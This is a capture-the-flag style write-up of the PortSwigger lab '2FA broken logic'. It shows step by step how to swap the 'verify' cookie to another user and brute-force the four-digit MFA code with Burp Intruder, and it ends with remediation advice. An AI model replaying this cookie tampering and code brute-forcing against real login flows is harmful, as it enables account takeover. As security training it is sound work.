# 2FA broken logic

**Category:** Authentication
**Level:** Practitioner
**Mechanism:** User-controlled `verify` cookie and brute-forceable 2FA code

**Lab URL:** https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

---

## Vulnerability

The 2FA flow uses the `verify` cookie to identify the account being verified. The value can be changed from `wiener` to `carlos`, causing the verification flow to target another account. The lab also allows repeated attempts against the four-digit MFA code, making it possible to brute-force the code with Intruder.

## Reconnaissance & Exploitation

**Step 1 — Inspect the 2FA flow.** Logged in with `wiener:peter` and followed the post-login flow to `GET /login2`. The request used a `verify=wiener` cookie and returned the 2FA page.

```http
GET /login2 HTTP/2
Cookie: verify=wiener; session=<session>
```

```http
HTTP/2 200 OK
```

**Step 2 — Check the email code.** Opened the lab email client and observed the security code sent to `wiener`.

```text
Your security code is 0348.
```

**Step 3 — Change the account being verified.** Sent `GET /login2` to Repeater and changed the `verify` cookie to `carlos`. The server returned the 2FA page and issued a session cookie for the verification flow.

```http
GET /login2 HTTP/2
Cookie: verify=carlos
```

```http
HTTP/2 200 OK
Set-Cookie: session=<verification session>; Secure; HttpOnly; SameSite=None
```

**Step 4 — Confirm the code is checked for the selected user.** Submitted the code received for `wiener` while `verify=carlos`. The response displayed **“Incorrect security code”**.

```http
POST /login2 HTTP/2
Cookie: verify=carlos
Content-Type: application/x-www-form-urlencoded

mfa-code=0348
```

```http
HTTP/2 200 OK

Incorrect security code
```

**Step 5 — Brute-force the four-digit code.** Sent the `POST /login2` request to Intruder, kept `verify=carlos`, and placed the payload position on `mfa-code`. Configured a four-digit numeric payload from `0000` to `9999`. Compared responses to identify the valid code.

```text
Payload type: Brute forcer
Character set: 0123456789
Minimum length: 4
Maximum length: 4
```

**Step 6 — Access Carlos's account.** Used the successful Intruder response in the browser and selected **My account**. The account page displayed Carlos's account and the lab was solved.

```http
POST /login2 HTTP/2
Cookie: verify=carlos
Content-Type: application/x-www-form-urlencoded

mfa-code=<valid four-digit code>
```

```http
HTTP/2 302 Found
```

## Impact

An attacker can change the account identifier used by the 2FA flow and brute-force the four-digit code, allowing access to another user's account.

## Remediation

- Bind the 2FA challenge to the authenticated user on the server. Do not rely on a client-controlled cookie to select the account being verified.
- Enforce strict rate limits, attempt limits and temporary lockouts for MFA code verification.
- Use short-lived, single-use MFA challenges and invalidate them after successful verification or expiration.

## References

- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts); CWE-287 (Improper Authentication)

## Notes

- The four-digit code is not included because it was not visible in the screenshots provided.
- The supplied Intruder screenshot shows the attack in progress at `275/10000` requests. The completion flow and account access are documented from the official lab solution.
